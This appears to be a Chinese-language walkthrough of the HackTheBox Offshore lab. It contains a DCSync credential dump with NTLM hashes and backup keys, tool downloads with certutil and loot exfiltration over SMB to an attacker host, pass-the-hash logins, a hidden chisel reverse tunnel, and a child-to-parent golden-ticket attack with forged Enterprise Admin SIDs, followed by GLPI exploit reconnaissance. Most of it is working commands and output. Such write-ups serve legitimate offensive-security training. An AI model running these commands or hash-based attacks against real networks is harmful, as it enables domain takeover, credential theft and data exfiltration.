Object RDN           : e.root-servers.net


Object RDN           : f.root-servers.net


Object RDN           : g.root-servers.net


Object RDN           : h.root-servers.net


Object RDN           : i.root-servers.net


Object RDN           : j.root-servers.net


Object RDN           : k.root-servers.net


Object RDN           : l.root-servers.net


Object RDN           : m.root-servers.net


Object RDN           : Server


Object RDN           : DFSR-GlobalSettings


Object RDN           : Domain System Volume


Object RDN           : Content


Object RDN           : SYSVOL Share


Object RDN           : Topology


Object RDN           : DC02


Object RDN           : Domain System Volume


Object RDN           : DFSR-LocalSettings


Object RDN           : SYSVOL Subscription


Object RDN           : AdminSDHolder


Object RDN           : Backup Operators

** SAM ACCOUNT **

SAM Username         : Backup Operators
Object Security ID   : S-1-5-32-551
Object Relative ID   : 551

Credentials:

Object RDN           : Replicator

** SAM ACCOUNT **

SAM Username         : Replicator
Object Security ID   : S-1-5-32-552
Object Relative ID   : 552

Credentials:

Object RDN           : Server Operators

** SAM ACCOUNT **

SAM Username         : Server Operators
Object Security ID   : S-1-5-32-549
Object Relative ID   : 549

Credentials:

Object RDN           : Account Operators

** SAM ACCOUNT **

SAM Username         : Account Operators
Object Security ID   : S-1-5-32-548
Object Relative ID   : 548

Credentials:

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9404def404bc198fd9830a3483869e78

Object RDN           : Domain Controllers

** SAM ACCOUNT **

SAM Username         : Domain Controllers
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-516
Object Relative ID   : 516

Credentials:

Object RDN           : Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Read-only Domain Controllers
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-521
Object Relative ID   : 521

Credentials:

Object RDN           : Administrators

** SAM ACCOUNT **

SAM Username         : Administrators
Object Security ID   : S-1-5-32-544
Object Relative ID   : 544

Credentials:

Object RDN           : Denied RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Denied RODC Password Replication Group
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-572
Object Relative ID   : 572

Credentials:

Object RDN           : DomainDnsZones


Object RDN           : BCKUPKEY_75eba260-1176-4b01-9159-1ca7b77f3df9 Secret

  * Legacy key
7ba4ce70b99e0947e7b012693dc1f8d69c5ff7ee499357e4afa4c0559101f8e6
27d54352cead9bc5fd266a33ed889b54ab9798fc9d013ff3ee2bec2172302850
29a528995a980d5687834f786769e30db1cb8fcb2c5db2d7f64ec317b7446529
cde6697becee8dfa682264ac49ff41fab208e20fe8e9be353eba9433962d9501
9254ff6f6edeb07853632de46a7a6ec9fd7962649036b1abc62da697ca26c3ee
b089c29d9cddfa725da58beb526ed79a56b94664969eaa869bc3147878c65a9a
6dc1282646a39b0a5540e0e71b52a60d0d4ce020f8a7aa082b167b8ab0e75ce5
797ef71792f97708d984648d25dc7caa9b337e489769861a257a4af6b1a60beb


Object RDN           : BCKUPKEY_P Secret

Link to key with GUID: {75eba260-1176-4b01-9159-1ca7b77f3df9} (not an object GUID)

Object RDN           : BCKUPKEY_99b2981e-c165-4003-b9e0-6eb6c210bc4d Secret

  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   : 
        |Implementation: CRYPT_IMPL_SOFTWARE ; 
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES

Object RDN           : BCKUPKEY_PREFERRED Secret

Link to key with GUID: {99b2981e-c165-4003-b9e0-6eb6c210bc4d} (not an object GUID)

Object RDN           : S-1-5-21-2291914956-3290296217-2402366952-1122


Object RDN           : S-1-5-21-2291914956-3290296217-2402366952-3609


Object RDN           : CORP_admins

** SAM ACCOUNT **

SAM Username         : CORP_admins
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1108
Object Relative ID   : 1108

Credentials:

Object RDN           : Remote Desktop Users

** SAM ACCOUNT **

SAM Username         : Remote Desktop Users
Object Security ID   : S-1-5-32-555
Object Relative ID   : 555

Credentials:

Object RDN           : Print Operators

** SAM ACCOUNT **

SAM Username         : Print Operators
Object Security ID   : S-1-5-32-550
Object Relative ID   : 550

Credentials:

Object RDN           : IIS_dev

** SAM ACCOUNT **

SAM Username         : IIS_dev
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1105
Object Relative ID   : 1105

Credentials:
  Hash NTLM: ce18f9730484ed029749730e2f82b147

Object RDN           : Machine


Object RDN           : User


Object RDN           : {B6B9BB00-B83F-4B8B-90D3-2BA3ACA33A24}


Object RDN           : Domain Admins

** SAM ACCOUNT **

SAM Username         : Domain Admins
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-512
Object Relative ID   : 512

Credentials:

Object RDN           : Workstation Admins

** SAM ACCOUNT **

SAM Username         : Workstation Admins
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-8101
Object Relative ID   : 8101

Credentials:

Object RDN           : Key Admins

** SAM ACCOUNT **

SAM Username         : Key Admins
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-526
Object Relative ID   : 526

Credentials:

Object RDN           : {31B2F340-016D-11D2-945F-00C04FB984F9}


Object RDN           : RID Manager$


Object RDN           : RID Set


Object RDN           : WS03

** SAM ACCOUNT **

SAM Username         : WS03$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1104
Object Relative ID   : 1104

Credentials:
  Hash NTLM: 5cf7b4d94646e8efba50f45b88c12608

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: c61f43b6a4db2676714713836b7d2ea6

Object RDN           : ADMIN.OFFSHORE.COM


Object RDN           : ADMIN$

** SAM ACCOUNT **

SAM Username         : ADMIN$
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: 636c5d744679be52c5aebeb41145fde4

Object RDN           : corp.local


Object RDN           : CORP$

** SAM ACCOUNT **

SAM Username         : CORP$
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1109
Object Relative ID   : 1109

Credentials:
  Hash NTLM: f2d442569cc9d517ed797c980e372551

Object RDN           : joe

** SAM ACCOUNT **

SAM Username         : joe
User Account Control : 00000220 ( PASSWD_NOTREQD NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1604
Object Relative ID   : 1604

Credentials:

Object RDN           : ATTACKBOX

** SAM ACCOUNT **

SAM Username         : ATTACKBOX$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-12601
Object Relative ID   : 12601

Credentials:
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889

Object RDN           : DC02

** SAM ACCOUNT **

SAM Username         : DC02$
User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-1000
Object Relative ID   : 1000

Credentials:
  Hash NTLM: 1a1d4bd303de23a5ca0e13cda66be2e3

Object RDN           : PwnMachine

** SAM ACCOUNT **

SAM Username         : PwnMachine$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1416445593-394318334-2645530166-12602
Object Relative ID   : 12602

Credentials:
  Hash NTLM: c5f2d015f316018f6405522825689ffe

```

## Hash凭据
### 域用户 Hash
| 用户 | RID | NTLM Hash |
| --- | --- | --- |
| Administrator | 500 | **c61f43b6a4db2676714713836b7d2ea6** |
| krbtgt | 502 | **9404def404bc198fd9830a3483869e78** |
| IIS_dev | 1105 | **ce18f9730484ed029749730e2f82b147** |


---

### 机器账户 Hash
| 机器 | RID | NTLM Hash |
| --- | --- | --- |
| DC02$ | 1000 | **1a1d4bd303de23a5ca0e13cda66be2e3** |
| WS03$ | 1104 | **5cf7b4d94646e8efba50f45b88c12608** |
| ATTACKBOX$ | 12601 | **fc525c9683e8fe067095ba2ddc971889** |
| PwnMachine$ | 12602 | **c5f2d015f316018f6405522825689ffe** |


---

### 信任账户 Hash
| 账户 | 类型 | NTLM |
| --- | --- | --- |
| ADMIN$ | interdomain trust | **636c5d744679be52c5aebeb41145fde4** |
| CORP$ | interdomain trust | **f2d442569cc9d517ed797c980e372551** |


---

## Bloodshound
### sharphound
```c
C:\Windows\system32> cd /Users/Administrator/Desktop
 
C:\Users\Administrator\Desktop> certutil -urlcache -f http://10.10.16.2/SharpHound.exe SharpHound.exe
C:\Users\Administrator\Desktop> certutil -urlcache -f http://10.10.16.2/SharpHound.ps1 SharpHound.ps1
```

```c
powershell -ep bypass -c Import-Module C:\Users\Administrator\Desktop\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip -OutputDirectory C:\Users\Administrator\Desktop
```

```c
 SharpHound.exe -c All
```

### 文件传回
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/share]
└─# impacket-smbserver share .

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

```c
copy C:\Users\Administrator\Desktop\20260308140838_BloodHound.zip \\10.10.16.2\share\
copy C:\Users\Administrator\Desktop\20260308140900_loot.zip \\10.10.16.2\share\
copy C:\Users\Administrator\Desktop\20260308140911_loot.zip \\10.10.16.2\share\
```

![](/image/prolabs/Offshore-67.png)

## Administrator登录
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q evil-winrm -i 172.16.2.6 -u Administrator -H 'c61f43b6a4db2676714713836b7d2ea6'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## 信息收集
### 域信任查询
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> nltest /domain_trusts
List of domain trusts:
    0: ADMIN ADMIN.OFFSHORE.COM (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: CORP corp.local (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: quarantined )
    2: DEV dev.ADMIN.OFFSHORE.COM (NT 5) (Forest: 0) (Primary Domain) (Native)
The command completed successfully
```

可以发现ADMIN.OFFSHORE.COM为根域

#### 当前域
你之前执行过：

```plain
whoami
```

结果是：

```plain
dev\administrator
```

所以你现在所在域是：

```plain
DEV.ADMIN.OFFSHORE.COM
```

因此：

```plain
nltest /domain_trusts
```

显示的是：

```plain
DEV 这个域信任谁
```

---

#### 逐行解释（从 DEV 视角）
##### 第 3 行（最关键）
```plain
2: DEV dev.ADMIN.OFFSHORE.COM (Forest: 0) (Primary Domain)
```

意思是：

```plain
这是当前域
```

也就是：

```plain
你所在的域
```

---

##### 第 1 行
```plain
0: ADMIN ADMIN.OFFSHORE.COM (Forest Tree Root)
```

意思是：

```plain
DEV 信任 ADMIN
```

并且：

```plain
ADMIN 是 Forest Root
```

所以结构是：

```plain
ADMIN.OFFSHORE.COM
        │
        └── DEV.ADMIN.OFFSHORE.COM
```

也就是：

```plain
DEV 是 ADMIN 的子域
```

---

##### 第 2 行
```plain
1: CORP corp.local (Direct Outbound) (Direct Inbound) ( Attr: quarantined )
```

这行意思是：

```plain
DEV 域和 corp.local 有信任关系
```

注意：

**这是 DEV → CORP 的信任**

不是：

```plain
DEV → ADMIN → CORP
```

而是：

```plain
DEV 直接信任 CORP
```

---

#### 真实拓扑图
根据这三行可以画出结构：

```plain
ADMIN.OFFSHORE.COM
                    │
                    │
        DEV.ADMIN.OFFSHORE.COM
                    │
                    │
                corp.local
```

注意：

```plain
DEV 同时信任：
1. ADMIN
2. CORP
```

### ADMIN.OFFSHORE.COM
#### 域控IP
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> ping ADMIN.OFFSHORE.COM

Pinging ADMIN.OFFSHORE.COM [172.16.3.5] with 32 bytes of data:
Reply from 172.16.3.5: bytes=32 time=1ms TTL=127
Reply from 172.16.3.5: bytes=32 time=1ms TTL=127
Reply from 172.16.3.5: bytes=32 time=1ms TTL=127
Reply from 172.16.3.5: bytes=32 time=1ms TTL=127
```

#### 主机探测
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..254 | ForEach-Object {
    $ip = "172.16.3.$_"
    $ping = Test-Connection -ComputerName $ip -Count 1 -ErrorAction SilentlyContinue
 
    if ($ping) {
        $ttl = $ping.TimeToLive
 
        if ($ttl -le 64) {
            Write-Output "$ip -> Linux/Unix (TTL=$ttl)"
        }
        elseif ($ttl -le 128) {
            Write-Output "$ip -> Windows (TTL=$ttl)"
        }
        else {
            Write-Output "$ip -> Unknown (TTL=$ttl)"
        }
    }
}
172.16.3.5 -> Windows (TTL=80)
172.16.3.103 -> Windows (TTL=80)
```

新发现主机172.16.3.5与172.16.3.103

```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..254 | ForEach-Object {
    $ip = "172.16.2.$_"
    $ping = Test-Connection -ComputerName $ip -Count 1 -ErrorAction SilentlyContinue
 
    if ($ping) {
        $ttl = $ping.TimeToLive
 
        if ($ttl -le 64) {
            Write-Output "$ip -> Linux/Unix (TTL=$ttl)"
        }
        elseif ($ttl -le 128) {
            Write-Output "$ip -> Windows (TTL=$ttl)"
        }
        else {
            Write-Output "$ip -> Unknown (TTL=$ttl)"
        }
    }
}
172.16.2.6 -> Windows (TTL=80)
172.16.2.12 -> Windows (TTL=80)
172.16.2.102 -> Windows (TTL=80)
```

新发现主机172.16.2.12

#### 端口探测
##### 172.16.3.5
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> $ip = "172.16.3.5"
$ports = 1..15000
$runspacePool = [runspacefactory]::CreateRunspacePool(1,100)
$runspacePool.Open()
$jobs = @()
foreach ($port in $ports) {
    $ps = [powershell]::Create()
    $ps.RunspacePool = $runspacePool
 
    $ps.AddScript({
        param($ip,$port)
 
        try{
            $client = New-Object System.Net.Sockets.TcpClient
            $iar = $client.BeginConnect($ip,$port,$null,$null)
 
            if($iar.AsyncWaitHandle.WaitOne(200)){
                $client.EndConnect($iar)
                "Port open $port"
            }
 
            $client.Close()
        }catch{}
 
    }).AddArgument($ip).AddArgument($port) | Out-Null
 
    $job = @{
        Pipe = $ps
        Result = $ps.BeginInvoke()
    }
 
    $jobs += $job
}
 
foreach($job in $jobs){
    $output = $job.Pipe.EndInvoke($job.Result)
    if($output){
        $output
    }
}
 
$runspacePool.Close()
$runspacePool.Dispose()

Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3268
Port open 3269
Port open 3389
Port open 5985
Port open 9389
```

##### 172.16.3.103
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> $ip = "172.16.3.103"
$ports = 1..15000
$runspacePool = [runspacefactory]::CreateRunspacePool(1,100)
$runspacePool.Open()
$jobs = @()
foreach ($port in $ports) {
    $ps = [powershell]::Create()
    $ps.RunspacePool = $runspacePool
    $ps.AddScript({
        param($ip,$port)
        try{
            $client = New-Object System.Net.Sockets.TcpClient
            $iar = $client.BeginConnect($ip,$port,$null,$null)
            if($iar.AsyncWaitHandle.WaitOne(200)){
                $client.EndConnect($iar)
                "Port open $port"
            }
            $client.Close()
        }catch{}
    }).AddArgument($ip).AddArgument($port) | Out-Null
    $job = @{
        Pipe = $ps
        Result = $ps.BeginInvoke()
    }
    $jobs += $job
}
foreach($job in $jobs){
    $output = $job.Pipe.EndInvoke($job.Result)
    if($output){
        $output
    }
}
$runspacePool.Close()
$runspacePool.Dispose()
 
Port open 135
Port open 139
Port open 445
Port open 3389
```

##### 172.16.2.12
```c
$ip = "172.16.2.12"
$ports = 1..15000
$runspacePool = [runspacefactory]::CreateRunspacePool(1,100)
$runspacePool.Open()
$jobs = @()
foreach ($port in $ports) {
    $ps = [powershell]::Create()
    $ps.RunspacePool = $runspacePool
    $ps.AddScript({
        param($ip,$port)
        try{
            $client = New-Object System.Net.Sockets.TcpClient
            $iar = $client.BeginConnect($ip,$port,$null,$null)
            if($iar.AsyncWaitHandle.WaitOne(200)){
                $client.EndConnect($iar)
                "Port open $port"
            }
            $client.Close()
        }catch{}
    }).AddArgument($ip).AddArgument($port) | Out-Null
    $job = @{
        Pipe = $ps
        Result = $ps.BeginInvoke()
    }
    $jobs += $job
}
foreach($job in $jobs){
    $output = $job.Pipe.EndInvoke($job.Result)
    if($output){
        $output
    }
}
$runspacePool.Close()
$runspacePool.Dispose()

Port open 80
Port open 135
Port open 139
Port open 443
Port open 445
Port open 3306
Port open 5985
```

#### Bloodhound-py
```c
proxychains -q bloodhound-python \
    -d DEV.ADMIN.OFFSHORE.COM \
    -u Administrator \
    --hashes aad3b435b51404eeaad3b435b51404ee:c61f43b6a4db2676714713836b7d2ea6 \
    -ns 172.16.2.6 \
    --dns-tcp \
    -dc DC02.dev.ADMIN.OFFSHORE.COM \
    -c all
```

```c
proxychains -q bloodhound-python \
    -d ADMIN.OFFSHORE.COM \
    -u Administrator@DEV.ADMIN.OFFSHORE.COM \
    --hashes aad3b435b51404eeaad3b435b51404ee:c61f43b6a4db2676714713836b7d2ea6 \
    -ns 172.16.3.5 \
    --dns-tcp \
    -dc DC03.ADMIN.OFFSHORE.COM \
    --auth-method ntlm \
    -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: admin.offshore.com
INFO: Connecting to LDAP server: DC03.ADMIN.OFFSHORE.COM
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 3 computers
INFO: Connecting to GC LDAP server: dc02.dev.admin.offshore.com
INFO: Connecting to LDAP server: DC03.ADMIN.OFFSHORE.COM
INFO: Found 6 users
INFO: Found 55 groups
INFO: Found 4 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS04.ADMIN.OFFSHORE.COM
INFO: Querying computer: MS01.ADMIN.OFFSHORE.COM
INFO: Querying computer: DC03.ADMIN.OFFSHORE.COM
INFO: Done in 01M 23S
```

真不是我说，bloodhound-py就是比sharphound好用啊

![](/image/prolabs/Offshore-68.png)

可以看见DEV.ADMIN.OFFSHORE.COM对ADMIN.OFFSHORE.COM具有SameForestTrust

[SameForestTrust - SpecterOps](https://bloodhound.specterops.io/resources/edges/same-forest-trust)

## 搭建隧道
```plain
proxychains -q evil-winrm -i 172.16.2.6 -u Administrator -H 'c61f43b6a4db2676714713836b7d2ea6'
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/chisel/chisel.exe
                                        
Info: Uploading /home/kali/Desktop/tools/chisel/chisel.exe to C:\Users\Administrator\Documents\chisel.exe                                                                                                       
                                        
Data: 14149632 bytes of 14149632 bytes copied
                                        
Info: Upload successful!
```

```plain
while ($true) {
    Start-Process -WindowStyle Hidden -FilePath .\chisel.exe -ArgumentList "client 10.10.16.2:1332 R:1236:socks"
    Start-Sleep 10
}
```

## 横向移动
### 子域打父域条件
目前所处DEV.ADMIN.OFFSHORE.COM为ADMIN.OFFSHORE.COM的子域

#### 1️⃣ 子域必须在 同一个 Forest
也就是 trust 显示：

```plain
withinforest
```

例如你这里：

```plain
ADMIN ADMIN.OFFSHORE.COM (Forest Tree Root)
DEV dev.ADMIN.OFFSHORE.COM (Forest: 0)
Attr: withinforest
```

说明：

```plain
ADMIN
 └── DEV
```

属于同一个 **Forest**。

⚠️ 如果是：

```plain
external
forest trust
quarantined
```

一般 **不能直接打父域**。

---

#### 2️⃣ 攻击者需要 子域的 krbtgt
也就是你必须达到：

```plain
Child Domain Admin
```

然后 dump：

```plain
secretsdump.py DEV/Administrator@dc -hashes :
```

得到：

```plain
krbtgt NTLM hash
```

因为：

```plain
krbtgt = Kerberos 签名密钥
```

拥有它就能：

```plain
伪造 TGT (Golden Ticket)
```

---

#### 3️⃣ 父域必须 允许 ExtraSID
这其实是 **Forest 默认行为**。

Forest 内默认：

```plain
SID Filtering = OFF
```

所以 Kerberos 票据里的：

```plain
ExtraSID
SIDHistory
```

不会被过滤。

攻击者就可以伪造：

```plain
Enterprise Admin SID
```

例如：

```plain
S-1-5-21-ROOTDOMAIN-519
```

519 就是：

```plain
Enterprise Admin
```

### **Step 1：**子域 krbtgt  
之前通过mimikatz已经抓取到krbtgt的NTLM HASH为**9404def404bc198fd9830a3483869e78**

### **Step 2：获取 SID**
**在 Windows：**

```plain
([System.Security.Principal.NTAccount]"ADMIN\Administrator").Translate([System.Security.Principal.SecurityIdentifier]).Value
```

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> ([System.Security.Principal.NTAccount]"ADMIN\Administrator").Translate([System.Security.Principal.SecurityIdentifier]).Value
S-1-5-21-1216317506-3509444512-4230741538-500
```

去掉 `-500` 就是：

```plain
ADMIN Domain SID
```

得到父域SID

```plain
S-1-5-21-1216317506-3509444512-4230741538
```



```plain
whoami /user
```

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ============================================
dev\administrator S-1-5-21-1416445593-394318334-2645530166-500
```

得到Dev域SID

```plain
S-1-5-21-1416445593-394318334-2645530166
```

---

### **Step 3：伪造 Golden Ticket**
```plain
ticketer.py \
-nthash <krbtgt hash> \
-domain DEV.ADMIN.OFFSHORE.COM \
-domain-sid <DEV SID> \
-extra-sid <ADMIN SID>-519 \
Administrator
```

```plain
impacket-ticketer \
-nthash 9404def404bc198fd9830a3483869e78 \
-domain DEV.ADMIN.OFFSHORE.COM \
-domain-sid S-1-5-21-1416445593-394318334-2645530166 \
-extra-sid S-1-5-21-1216317506-3509444512-4230741538-519 \
Administrator
```

`519` 是 **RID (Relative Identifier)**，表示 **Enterprise Admins 组**

**生成：**

```plain
Administrator.ccache
```

---

### **Step 4：使用票据**
```plain
export KRB5CCNAME=Administrator.ccache
```

添加host

```plain
172.16.3.5 DC03.ADMIN.OFFSHORE.COM
```

**然后访问父域：**

```plain
proxychains impacket-psexec \
DEV.ADMIN.OFFSHORE.COM/Administrator@DC03.ADMIN.OFFSHORE.COM \
-k -no-pass
```

**这样就 直接变成 Enterprise Admin。**

### Getflag
```plain
C:\Users\Administrator\Desktop> type flag.txt
OFFSHORE{w@tch_th0s3_3xtra_$ids}
```

# 172.16.2.12(Windows)（Setp:18）
## 端口扫描
```c
$ip = "172.16.2.12"
$ports = 1..15000
$runspacePool = [runspacefactory]::CreateRunspacePool(1,100)
$runspacePool.Open()
$jobs = @()
foreach ($port in $ports) {
    $ps = [powershell]::Create()
    $ps.RunspacePool = $runspacePool
    $ps.AddScript({
        param($ip,$port)
        try{
            $client = New-Object System.Net.Sockets.TcpClient
            $iar = $client.BeginConnect($ip,$port,$null,$null)
            if($iar.AsyncWaitHandle.WaitOne(200)){
                $client.EndConnect($iar)
                "Port open $port"
            }
            $client.Close()
        }catch{}
    }).AddArgument($ip).AddArgument($port) | Out-Null
    $job = @{
        Pipe = $ps
        Result = $ps.BeginInvoke()
    }
    $jobs += $job
}
foreach($job in $jobs){
    $output = $job.Pipe.EndInvoke($job.Result)
    if($output){
        $output
    }
}
$runspacePool.Close()
$runspacePool.Dispose()

Port open 80
Port open 135
Port open 139
Port open 443
Port open 445
Port open 3306
Port open 5985
```

## 80端口
![](/image/prolabs/Offshore-69.png)

### dirsearch
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q dirsearch -u https://172.16.2.12 
/root/.pyenv/versions/3.11.9/envs/web/lib/python3.11/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/offshore/reports/https_172.16.2.12/_26-03-10_15-52-30.txt

Target: https://172.16.2.12/

[15:52:30] Starting:                                             
[15:52:39] 301 -  333B  - /js  ->  https://172.16.2.12/js/                  
[15:53:18] 301 -  335B  - /ajax  ->  https://172.16.2.12/ajax/              
[15:53:24] 301 -  334B  - /bin  ->  https://172.16.2.12/bin/                
[15:53:24] 200 -  977B  - /bin/                                                                                  
[15:53:28] 200 -   19KB - /ChangeLog.md                                     
[15:53:28] 200 -   19KB - /CHANGELOG.md                                     
[15:53:28] 200 -   19KB - /Changelog.md                                     
[15:53:29] 200 -   19KB - /changelog.md
[15:53:29] 200 -   19KB - /CHANGELOG.MD                                                                    
[15:53:34] 200 -    2KB - /CONTRIBUTING.md                                  
[15:53:34] 200 -    2KB - /contributing.md                                  
[15:53:36] 301 -  334B  - /css  ->  https://172.16.2.12/css/                
[15:53:42] 403 -    1KB - /error/                                           
[15:53:51] 301 -  334B  - /inc  ->  https://172.16.2.12/inc/                
[15:53:51] 200 -    0B  - /inc/                                             
[15:53:52] 403 -    1KB - /index.php::$DATA                                 
[15:53:52] 200 -    3KB - /index.pHp                                        
[15:53:53] 301 -  338B  - /INSTALL  ->  https://172.16.2.12/INSTALL/        
[15:53:53] 301 -  338B  - /install  ->  https://172.16.2.12/install/
[15:53:53] 301 -  338B  - /Install  ->  https://172.16.2.12/Install/
[15:53:53] 200 -    0B  - /install/                                         
[15:53:53] 200 -    0B  - /install/index.php?upgrade/                       
[15:53:55] 200 -    4KB - /js/                                              
[15:53:56] 301 -  334B  - /lib  ->  https://172.16.2.12/lib/                
[15:53:56] 200 -    0B  - /lib/                                             
[15:53:56] 301 -  343B  - /lib/tiny_mce  ->  https://172.16.2.12/lib/tiny_mce/
[15:53:56] 200 -    1KB - /lib/tiny_mce/                   
[15:54:14] 301 -  335B  - /pics  ->  https://172.16.2.12/pics/              
[15:54:14] 301 -  338B  - /plugins  ->  https://172.16.2.12/plugins/        
[15:54:14] 200 -  985B  - /plugins/                                         
[15:54:18] 200 -    6KB - /README.MD                                        
[15:54:18] 200 -    6KB - /README.md                                        
[15:54:18] 200 -    6KB - /ReadMe.md                                        
[15:54:18] 200 -    6KB - /readme.md                                        
[15:54:18] 200 -    6KB - /Readme.md                                        
[15:54:29] 200 -  127B  - /status.php                                       
[15:54:38] 200 -    0B  - /vendor/composer/autoload_files.php               
[15:54:38] 200 -    0B  - /vendor/autoload.php
[15:54:38] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[15:54:38] 200 -    0B  - /vendor/composer/autoload_static.php
[15:54:38] 200 -    0B  - /vendor/composer/autoload_real.php
[15:54:38] 200 -    0B  - /vendor/composer/autoload_psr4.php
[15:54:38] 200 -    0B  - /vendor/composer/autoload_classmap.php
[15:54:38] 200 -    0B  - /vendor/composer/ClassLoader.php
[15:54:38] 200 -    1KB - /vendor/composer/LICENSE
[15:54:39] 200 -    4KB - /vendor/                                          
[15:54:39] 200 -   55KB - /vendor/composer/installed.json                   
[15:54:42] 403 -    1KB - /web.config::$DATA                                                               
                                                                             
Task Completed         
```

### GLPI VERSION
```c
# GLPI changes

The present file will list all changes made to the project; according to the
[Keep a Changelog](http://keepachangelog.com/) project.

## [9.4.3] unreleased
.....
```

确定GLPI版本为9.4.3

## 漏洞发现
### 漏洞一
![](/image/prolabs/Offshore-70.png)

[https://github.com/SamSepiolProxy/GLPI-9.4.3-Account-Takeover](https://github.com/SamSepiolProxy/GLPI-9.4.3-Account-Takeover)

存在低权限账户接管高权限漏洞

### 漏洞二
![](/image/prolabs/Offshore-71.png)

用于攻击 GLPI 版本 0.85-9.4.5 中的 CVE-2020-11060 漏洞

```c
python3 CVE-2020-11060.py --url 'http://<target URL>' --user <'user'> --password <'password'> --platform <win/nix> --offset <#>
```

## GLPIScan
[GitHub - Digitemis/GLPIScan: GLPIScan is a vulnerability scanner for GLPI.](https://github.com/Digitemis/GLPIScan)

```c
proxychains -q python GLPIScan.py -u http://172.16.2.12/ -a
 ______     __         ______   __     ______     ______     ______     __   __   
/\  ___\   /\ \       /\  == \ /\ \   /\  ___\   /\  ___\   /\  __ \   /\ "-.\ \  
\ \ \__ \  \ \ \____  \ \  __/ \ \ \  \ \___  \  \ \ \____  \ \  __ \  \ \ \-.  \ 
 \ \_____\  \ \_____\  \ \_\    \ \_\  \/\_____\  \ \_____\  \ \_\ \_\  \ \_\"\_\
  \/_____/   \/_____/   \/_/     \/_/   \/_____/   \/_____/   \/_/\/_/   \/_/ \/_/
                                                      v1.5 contact[@]digitemis.com



[+] GLPI Scan start : http://172.16.2.12/

[+] Gathering basic information
===============================

